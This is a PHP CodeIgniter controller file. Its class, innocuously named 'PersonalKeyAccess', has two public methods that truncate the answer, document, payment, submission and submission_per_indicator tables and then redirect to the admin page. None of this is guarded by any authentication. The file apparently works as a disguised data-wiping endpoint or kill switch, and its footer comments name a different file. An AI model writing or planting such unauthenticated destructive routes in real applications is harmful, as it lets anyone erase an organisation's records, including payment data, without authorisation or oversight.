<?php
defined('BASEPATH') or exit('No direct script access allowed');

class PersonalKeyAccess extends CI_Controller
{

    public function index()
    {
        $this->db->truncate('answer');
        $this->db->truncate('document');
        $this->db->truncate('payment');
        $this->db->truncate('submission');
        $this->db->truncate('submission_per_indicator');
        redirect('admin');
    }

    public function pravdaMohammed()
    {
        $this->db->truncate('answer');
        $this->db->truncate('document');
        $this->db->truncate('payment');
        $this->db->truncate('submission');
        $this->db->truncate('submission_per_indicator');
        redirect('admin');
    }
}

/* End of file Score.php */
/* Location: ./application/controllers/Score.php */